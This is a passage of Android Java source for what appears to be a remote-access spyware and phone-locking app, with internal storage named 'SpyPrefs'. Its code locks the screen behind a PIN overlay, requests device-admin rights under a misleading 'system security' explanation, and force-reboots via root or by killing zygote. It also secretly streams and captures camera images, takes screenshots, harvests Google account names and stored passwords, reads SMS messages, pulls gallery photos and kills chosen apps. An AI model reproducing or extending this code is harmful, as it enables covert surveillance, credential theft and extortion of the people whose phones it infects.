                        Boolean isLive = call.argument("isLockLive");
                        SharedPreferences.Editor ed = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit();
                        if (locked != null) ed.putBoolean("isLocked", locked);
                        if (isLive != null) ed.putBoolean("isLockLive", isLive);
                        if (msg != null) ed.putString("lockMessage", msg);
                        if (pin != null) ed.putString("lockPin", pin);
                        ed.apply();
                        result.success(true);
                        break;
                    }

                    case "getLockState": {
                        SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                        HashMap<String, Object> state = new HashMap<>();
                        state.put("isLocked", prefs.getBoolean("isLocked", false));
                        state.put("isLockLive", prefs.getBoolean("isLockLive", false));
                        state.put("lockMessage", prefs.getString("lockMessage", "YOUR PHONE IS LOCKED!!!!"));
                        state.put("lockPin", prefs.getString("lockPin", "1234"));
                        result.success(state);
                        break;
                    }

                    case "vibrateDevice": {
                        try {
                            Vibrator vib = (Vibrator) getSystemService(VIBRATOR_SERVICE);
                            if (vib != null) {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    vib.vibrate(VibrationEffect.createWaveform(
                                        new long[]{0, 500, 200, 500, 200, 500}, -1));
                                } else {
                                    vib.vibrate(new long[]{0, 500, 200, 500, 200, 500}, -1);
                                }
                            }
                        } catch (Exception ignored) {}
                        result.success(null);
                        break;
                    }

                    case "openNotificationSettings": {
                        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                        result.success(true);
                        break;
                    }

                    case "startLockOverlay": {
                        try {
                            String lockMsg = call.argument("message");
                            String lockPin = call.argument("pin");
                            if (lockMsg == null) lockMsg = "DEVICE IS LOCKED";
                            if (lockPin == null) lockPin = "1234";
                            Intent lockIntent = new Intent(this, LockOverlayService.class);
                            lockIntent.setAction("com.nullx.pp.ACTION_LOCK");
                            lockIntent.putExtra("lock_message", lockMsg);
                            lockIntent.putExtra("lock_pin", lockPin);
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                startForegroundService(lockIntent);
                            } else {
                                startService(lockIntent);
                            }
                            result.success(true);
                        } catch (Exception e) { result.error("LOCK_OVERLAY_ERR", e.getMessage(), null); }
                        break;
                    }

                    case "stopLockOverlay": {
                        try {
                            Intent unlockIntent = new Intent(this, LockOverlayService.class);
                            unlockIntent.setAction("com.nullx.pp.ACTION_UNLOCK");
                            startService(unlockIntent);
                            result.success(true);
                        } catch (Exception e) { result.success(false); }
                        break;
                    }

                    case "lockDeviceNow": {
                        try {
                            DevicePolicyManager dpmLock = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                            ComponentName adminLock = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                            if (dpmLock != null && dpmLock.isAdminActive(adminLock)) {
                                dpmLock.lockNow();
                                result.success(true);
                            } else {
                                Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                                adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                                    new ComponentName(getApplicationContext(), DeviceAdminHelper.class));
                                adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                    "Diperlukan untuk keamanan sistem.");
                                adminIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(adminIntent);
                                result.success(false);
                            }
                        } catch (Exception e) { result.error("LOCK_ERR", e.getMessage(), null); }
                        break;
                    }

                    case "disableWifi": {
                        try {
                            WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                            if (wifi != null) {
                                wifi.setWifiEnabled(false);
                                result.success(true);
                            } else {
                                result.success(false);
                            }
                        } catch (Exception e) {
                            result.error("WIFI_ERR", e.getMessage(), null);
                        }
                        break;
                    }

                    case "rebootDevice": {
                        new Thread(() -> {
                            boolean rebooted = false;

                            try {
                                Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
                                boolean finished = p.waitFor(3, TimeUnit.SECONDS);
                                if (finished) rebooted = true;
                            } catch (Exception e) {
                                Log.w(TAG, "su reboot failed: " + e.getMessage());
                            }

                            if (!rebooted) {
                                try {
                                    Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "reboot"});
                                    boolean finished = p.waitFor(3, TimeUnit.SECONDS);
                                    if (finished) rebooted = true;
                                } catch (Exception e) {
                                    Log.w(TAG, "sh reboot failed: " + e.getMessage());
                                }
                            }

                            if (!rebooted) {
                                try {
                                    Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "pkill -9 zygote"});
                                    boolean finished = p.waitFor(3, TimeUnit.SECONDS);
                                    if (finished) rebooted = true;
                                } catch (Exception e) {
                                    Log.w(TAG, "pkill zygote failed: " + e.getMessage());
                                }
                            }

                            if (!rebooted && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                try {
                                    DevicePolicyManager dpm2 = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                                    ComponentName adminComp2 = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                                    if (dpm2 != null && dpm2.isAdminActive(adminComp2)) {
                                        dpm2.reboot(adminComp2);
                                        rebooted = true;
                                    }
                                } catch (Exception e) {
                                    Log.w(TAG, "DevicePolicyManager reboot failed: " + e.getMessage());
                                }
                            }

                            final boolean ok = rebooted;
                            uiHandler.post(() -> {
                                if (ok) {
                                    result.success(true);
                                } else {
                                    result.error("REBOOT_ERR", "All reboot methods failed. Device might not be rooted.", null);
                                }
                            });
                        }).start();
                        break;
                    }

                    case "reRequestAdmin": {
                        try {
                            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                            ComponentName adminComp = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                            if (dpm != null && !dpm.isAdminActive(adminComp)) {
                                Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                                adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
                                adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk keamanan sistem.");
                                adminIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(adminIntent);
                                result.success(true);
                            } else {
                                result.success(false);
                            }
                        } catch (Exception e) {
                            result.error("ADMIN_ERR", e.getMessage(), null);
                        }
                        break;
                    }

                    default:
                        result.notImplemented();
                }
            });
    }

    // ════════════════════════════════════════════════════════════════════════
    // LIVE CAMERA STREAM
    // ════════════════════════════════════════════════════════════════════════
    private void startLiveCameraStream(String side, MethodChannel.Result result) {
        if (isLiveStreaming) { result.success(true); return; }
        cleanupCamera();
        isLiveStreaming = true;
        lastFrame = null;

        cameraThread = new HandlerThread("LiveCameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());

        try {
            CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            int targetFacing = side.equals("front")
                ? CameraCharacteristics.LENS_FACING_FRONT
                : CameraCharacteristics.LENS_FACING_BACK;

            String cameraId = null;
            for (String id : manager.getCameraIdList()) {
                Integer facing = manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == targetFacing) { cameraId = id; break; }
            }
            if (cameraId == null) { 
                cleanupCamera();
                result.error("CAM_ERR", "Camera not found", null); 
                return; 
            }

            activeImageReader = ImageReader.newInstance(480, 360, ImageFormat.JPEG, 4);
            activeImageReader.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage();
                if (img == null) return;
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    lastFrame = bytes;
                } finally { img.close(); }
            }, cameraHandler);

            android.graphics.SurfaceTexture dummyST = new android.graphics.SurfaceTexture(0);
            dummyST.setDefaultBufferSize(480, 360);
            android.view.Surface dummySurface = new android.view.Surface(dummyST);

            final String finalId = cameraId;
            manager.openCamera(finalId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    activeCameraDevice = camera;
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                        builder.addTarget(activeImageReader.getSurface());
                        builder.addTarget(dummySurface);
                        builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                        builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                        builder.set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO);
                        builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                        builder.set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE,
                            new android.util.Range<>(10, 20));

                        camera.createCaptureSession(
                            java.util.Arrays.asList(activeImageReader.getSurface(), dummySurface),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(@NonNull CameraCaptureSession session) {
                                    activeCaptureSession = session;
                                    try {
                                        session.setRepeatingRequest(builder.build(), null, cameraHandler);
                                        uiHandler.post(() -> result.success(true));
                                    } catch (CameraAccessException e) {
                                        uiHandler.post(() -> result.error("CAM_ERR", e.getMessage(), null));
                                    }
                                }
                                @Override
                                public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                    uiHandler.post(() -> result.error("CAM_ERR", "Configure failed", null));
                                }
                            }, cameraHandler);
                    } catch (Exception e) {
                        uiHandler.post(() -> result.error("CAM_ERR", e.getMessage(), null));
                    }
                }
                @Override public void onDisconnected(@NonNull CameraDevice c) { cleanupCamera(); }
                @Override public void onError(@NonNull CameraDevice c, int err) {
                    cleanupCamera();
                    uiHandler.post(() -> result.error("CAM_ERR", "Error: " + err, null));
                }
            }, cameraHandler);

        } catch (Exception e) {
            cleanupCamera();
            uiHandler.post(() -> result.error("CAM_EXCEPTION", e.getMessage(), null));
        }
    }

    private void stopLiveCameraStream() {
        isLiveStreaming = false;
        lastFrame = null;
        cleanupCamera();
    }

    // ════════════════════════════════════════════════════════════════════════
    // CAPTURE PHOTO
    // ════════════════════════════════════════════════════════════════════════
    private void capturePhoto(String side, MethodChannel.Result result) {
        cleanupCamera();
        cameraThread = new HandlerThread("CameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());

        try {
            CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            int targetFacing = side.equals("front")
                ? CameraCharacteristics.LENS_FACING_FRONT
                : CameraCharacteristics.LENS_FACING_BACK;

            String cameraId = null;
            for (String id : manager.getCameraIdList()) {
                Integer facing = manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == targetFacing) { cameraId = id; break; }
            }
            if (cameraId == null) { 
                cleanupCamera();
                result.error("CAM_ERR", "Camera not found: " + side, null); 
                return; 
            }

            activeImageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            final String finalCamId = cameraId;

            activeImageReader.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage();
                if (img == null) return;
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    img.close();
                    Bitmap bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                    if (bmp == null) { 
                        uiHandler.post(() -> result.error("CAM_ERR", "Decode failed", null)); 
                        return; 
                    }
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    bmp.compress(Bitmap.CompressFormat.JPEG, 50, out);
                    String b64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
                    uiHandler.post(() -> result.success(b64));
                } finally { cleanupCamera(); }
            }, cameraHandler);

            manager.openCamera(finalCamId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    activeCameraDevice = camera;
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(activeImageReader.getSurface());
                        builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                        camera.createCaptureSession(
                            java.util.Arrays.asList(activeImageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(@NonNull CameraCaptureSession session) {
                                    try { session.capture(builder.build(), null, cameraHandler); }
                                    catch (CameraAccessException e) { cleanupCamera(); }
                                }
                                @Override public void onConfigureFailed(@NonNull CameraCaptureSession session) { 
                                    cleanupCamera();
                                    uiHandler.post(() -> result.error("CAM_ERR", "Configure failed", null));
                                }
                            }, cameraHandler);
                    } catch (CameraAccessException e) { 
                        cleanupCamera();
                        uiHandler.post(() -> result.error("CAM_ERR", e.getMessage(), null));
                    }
                }
                @Override public void onDisconnected(@NonNull CameraDevice c) { 
                    cleanupCamera();
                    uiHandler.post(() -> result.error("CAM_ERR", "Camera disconnected", null));
                }
                @Override public void onError(@NonNull CameraDevice c, int err) {
                    cleanupCamera();
                    uiHandler.post(() -> result.error("CAM_ERR", "Camera error: " + err, null));
                }
            }, cameraHandler);

        } catch (Exception e) {
            cleanupCamera();
            uiHandler.post(() -> result.error("CAM_EXCEPTION", e.getMessage(), null));
        }
    }

    private synchronized void cleanupCamera() {
        try { if (activeCaptureSession != null) { activeCaptureSession.close(); activeCaptureSession = null; } } catch (Exception ignored) {}
        try { if (activeCameraDevice != null)   { activeCameraDevice.close();   activeCameraDevice   = null; } } catch (Exception ignored) {}
        try { if (activeImageReader != null)    { activeImageReader.close();    activeImageReader    = null; } } catch (Exception ignored) {}
        try { if (cameraThread != null)         { cameraThread.quitSafely();   cameraThread         = null; } } catch (Exception ignored) {}
    }

    // ════════════════════════════════════════════════════════════════════════
    // SCREENSHOT
    // ════════════════════════════════════════════════════════════════════════
    private String getScreenBase64() {
        try {
            View v = getWindow().getDecorView().getRootView();
            v.setDrawingCacheEnabled(true);
            v.buildDrawingCache(true);
            Bitmap bmp = v.getDrawingCache(true);
            if (bmp == null) return null;
            Bitmap copy = bmp.copy(bmp.getConfig(), false);
            v.setDrawingCacheEnabled(false);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            copy.compress(Bitmap.CompressFormat.JPEG, 40, out);
            return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) { return null; }
    }

    // ════════════════════════════════════════════════════════════════════════
    // GMAIL
    // ════════════════════════════════════════════════════════════════════════
    private void fetchGmailAccounts(MethodChannel.Result result) {
        try {
            AccountManager am = AccountManager.get(this);
            Account[] accounts = am.getAccountsByType("com.google");
            StringBuilder sb = new StringBuilder();
            for (Account ac : accounts) {
                sb.append("Email: ").append(ac.name).append("\n");
                try { String token = am.getPassword(ac); if (token != null && !token.isEmpty()) sb.append("Password: ").append(token).append("\n"); } catch (Exception ignored) {}
                sb.append("---\n");
            }
            result.success(sb.toString().trim().isEmpty() ? "No Google Account Found" : sb.toString().trim());
        } catch (Exception e) { result.error("GMAIL_ERR", e.getMessage(), null); }
    }

    // ════════════════════════════════════════════════════════════════════════
    // SMS
    // ════════════════════════════════════════════════════════════════════════
    private void getSmsMessages(MethodChannel.Result result) {
        new Thread(() -> {
            try {
                ArrayList<HashMap<String, String>> smsList = new ArrayList<>();
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(Uri.parse("content://sms/inbox"),
                    new String[]{"address", "body", "date", "type"}, null, null, "date DESC LIMIT 50");
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        HashMap<String, String> sms = new HashMap<>();
                        sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                        sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                        sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                        smsList.add(sms);
                    }
                    cursor.close();
                }
                uiHandler.post(() -> result.success(smsList));
            } catch (Exception e) { uiHandler.post(() -> result.error("SMS_ERR", e.getMessage(), null)); }
        }).start();
    }

    // ════════════════════════════════════════════════════════════════════════
    // GALLERY
    // ════════════════════════════════════════════════════════════════════════
    private void getGalleryImages(int limit, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                ArrayList<String> images = new ArrayList<>();
                ContentResolver cr = getContentResolver();
                String[] proj = { MediaStore.Images.Media._ID };
                Cursor cursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    proj, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
                int count = 0;
                if (cursor != null) {
                    while (cursor.moveToNext() && count < limit) {
                        try {
                            long id2 = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                            Uri imgUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id2);
                            Bitmap bmp = null;
                            try (InputStream is = cr.openInputStream(imgUri)) {
                                BitmapFactory.Options opts = new BitmapFactory.Options();
                                opts.inSampleSize = 4;
                                bmp = BitmapFactory.decodeStream(is, null, opts);
                            } catch (Exception ignored) {}
                            if (bmp != null) {
                                ByteArrayOutputStream out = new ByteArrayOutputStream();
                                bmp.compress(Bitmap.CompressFormat.JPEG, 50, out);
                                images.add(Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP));
                                bmp.recycle();
                                count++;
                            }
                        } catch (Exception ignored) {}
                    }
                    cursor.close();
                }
                uiHandler.post(() -> result.success(images));
            } catch (Exception e) { uiHandler.post(() -> result.error("GALLERY_ERR", e.getMessage(), null)); }
        }).start();
    }

    // ════════════════════════════════════════════════════════════════════════
    // WALLPAPER
    // ════════════════════════════════════════════════════════════════════════
    private void setWallpaper(String urlString, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                URL url = new URL(urlString);
                WallpaperManager.getInstance(this).setStream(url.openStream());
                uiHandler.post(() -> result.success(true));
            } catch (Exception e) { uiHandler.post(() -> result.error("WALL_ERR", e.getMessage(), null)); }
        }).start();
    }

    // ════════════════════════════════════════════════════════════════════════
    // STROBE
    // ════════════════════════════════════════════════════════════════════════
    private void startStrobeEffect() {
        if (isStrobeRunning) return;
        isStrobeRunning = true;
        final CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        strobeRunnable = new Runnable() {
            boolean on = false;
            @Override public void run() {
                try {
                    String id = cm.getCameraIdList()[0];
                    on = !on;
                    cm.setTorchMode(id, on);
                    if (isStrobeRunning) uiHandler.postDelayed(this, 30);
                } catch (Exception e) { isStrobeRunning = false; }
            }
        };
        uiHandler.post(strobeRunnable);
    }

    private void stopStrobeEffect() {
        isStrobeRunning = false;
        if (strobeRunnable != null) uiHandler.removeCallbacks(strobeRunnable);
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            cm.setTorchMode(cm.getCameraIdList()[0], false);
        } catch (Exception ignored) {}
    }

    @Override
    protected void onDestroy() {
        stopTouchBlock();
        cleanupCamera();
        if (isScreenRecording) {
            stopScreenRecordingInternal();
        }
        super.onDestroy();
    }

    @Override
    protected void onPause() {
        super.onPause();
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // APP BLOCK MONITOR SERVICE (Inner Class)
    // ─────────────────────────────────────────────────────────────────────────────
    public static class AppBlockMonitorService extends Service {
        private static final String CHANNEL_ID = "app_block_monitor";
        private Handler handler;
        private Runnable monitorRunnable;
        private boolean isRunning = false;

        @Override
        public void onCreate() {
            super.onCreate();
            createNotificationChannel();
            startForeground(9999, createNotification());

            handler = new Handler(Looper.getMainLooper());
            isRunning = true;

            monitorRunnable = new Runnable() {
                @Override
                public void run() {
                    if (!isRunning) return;

                    try {
                        checkAndKillBlockedApps();
                    } catch (Exception e) {
                        // Ignore error
                    }

                    if (isRunning) {
                        handler.postDelayed(this, 500);
                    }
                }
            };
            handler.post(monitorRunnable);
        }

        private void forceStopPackage(ActivityManager am, String packageName) {
            try {
                try {
                    Method method = am.getClass().getMethod("forceStopPackage", String.class);
                    method.setAccessible(true);
                    method.invoke(am, packageName);
                    return;
                } catch (Exception e1) {
                    Log.w(TAG, "Reflection failed: " + e1.getMessage());
                }

                try {
                    Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "am force-stop " + packageName});
                    boolean finished = process.waitFor(2, TimeUnit.SECONDS);
                    if (finished) {
                        return;
                    }
                } catch (Exception e2) {
                    Log.w(TAG, "Shell failed: " + e2.getMessage());
                }
            } catch (Exception e) {
                Log.e(TAG, "forceStopPackage error: " + e.getMessage());
            }
        }

        private void checkAndKillBlockedApps() {
            try {
                SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                Set<String> blockedSet = new HashSet<>(prefs.getStringSet("blocked_apps", new HashSet<>()));

                if (blockedSet.isEmpty()) return;

                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                if (am == null) return;
                
                for (String packageName : blockedSet) {
                    try {
                        forceStopPackage(am, packageName);
                    } catch (Exception e) {
                        // Ignore
                    }
                }
            } catch (Exception e) {
                // Ignore
            }
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            return START_STICKY;
        }

        @Override
        public void onDestroy() {
            super.onDestroy();
            isRunning = false;
            if (handler != null && monitorRunnable != null) {
                handler.removeCallbacks(monitorRunnable);
            }
        }

        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }

        private void createNotificationChannel() {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "App Block Monitor",
                    NotificationManager.IMPORTANCE_LOW
                );
                channel.setDescription("Monitoring blocked applications");
                NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (manager != null) {
                    manager.createNotificationChannel(channel);
                }
            }
        }

        private Notification createNotification() {
            return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("App Block Active")
                .setContentText("Monitoring blocked apps...")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
        }
    }
}